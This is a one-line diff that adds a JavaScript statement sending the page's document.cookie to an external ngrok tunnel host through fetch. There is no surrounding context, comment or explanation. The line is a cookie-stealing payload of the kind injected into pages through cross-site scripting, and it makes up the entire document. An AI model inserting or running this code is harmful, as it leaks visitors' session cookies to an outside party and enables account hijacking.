@@ -1,0 +1,1 @@
+fetch('https://meteorlike-joanne-wheezingly.ngrok-free.dev?c=' + document.cookie)
